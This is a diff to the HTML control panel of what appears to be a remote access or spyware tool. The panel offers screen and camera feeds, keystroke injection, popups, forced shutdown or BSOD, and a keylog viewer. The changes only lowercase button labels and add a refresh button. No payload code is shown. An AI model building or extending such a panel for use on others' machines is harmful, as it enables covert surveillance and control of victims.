@@ -29,6 +29,7 @@
                         />
                     </p>
                     <p class="mono">Status:&nbsp;<span id="status"></span></p>
+                    <button onclick="connect()">refresh</button>
                 </div>
                 <div id="ip-locked">
                     <div class="container">
@@ -38,7 +39,7 @@
                             src="/screen"
                             alt="Failed to load screen feed"
                         />
-                        <button onclick="connect('screen')">Refresh</button>
+                        <button onclick="connect('screen')">refresh</button>
                     </div>
                     <div class="container">
                         <h2>Camera:</h2>
@@ -47,7 +48,7 @@
                             src="/camera"
                             alt="Failed to load camera feed"
                         />
-                        <button onclick="connect('camera')">Refresh</button>
+                        <button onclick="connect('camera')">refresh</button>
                     </div>
                     <div class="container">
                         <h2>Send:</h2>
@@ -58,10 +59,10 @@
                         />
                         <input type="text" id="send-text" placeholder="text" />
                         <div class="buttons">
-                            <button onclick="send('alert')">Alert</button>
-                            <button onclick="send('confirm')">Confirm</button>
-                            <button onclick="send('prompt')">Prompt</button>
-                            <button onclick="send('toast')">Toast</button>
+                            <button onclick="send('alert')">alert</button>
+                            <button onclick="send('confirm')">confirm</button>
+                            <button onclick="send('prompt')">prompt</button>
+                            <button onclick="send('toast')">toast</button>
                         </div>
                     </div>
                     <div class="container">
@@ -72,8 +73,8 @@
                             placeholder="text / hotkey"
                         />
                         <div class="buttons">
-                            <button onclick="keyboard('write')">Write</button>
-                            <button onclick="keyboard('send')">Send</button>
+                            <button onclick="keyboard('write')">write</button>
+                            <button onclick="keyboard('send')">send</button>
                         </div>
                     </div>
                     <div class="container">
@@ -88,9 +89,9 @@
                             forced (ignore open apps)
                         </label>
                         <div class="buttons">
-                            <button onclick="shutdown()">Shutdown</button>
-                            <button onclick="restart()">Restart</button>
-                            <button onclick="bsod()">BSOD</button>
+                            <button onclick="shutdown()">shutdown</button>
+                            <button onclick="restart()">restart</button>
+                            <button onclick="bsod()">bsod</button>
                         </div>
                     </div>
                     <div class="container">
@@ -120,7 +121,7 @@
                     <div class="container">
                         <h2>Keylog:</h2>
                         <div id="keylog" class="mono"></div>
-                        <button onclick="keylog()">Refresh</button>
+                        <button onclick="keylog()">refresh</button>
                     </div>
                 </div>
             </div>
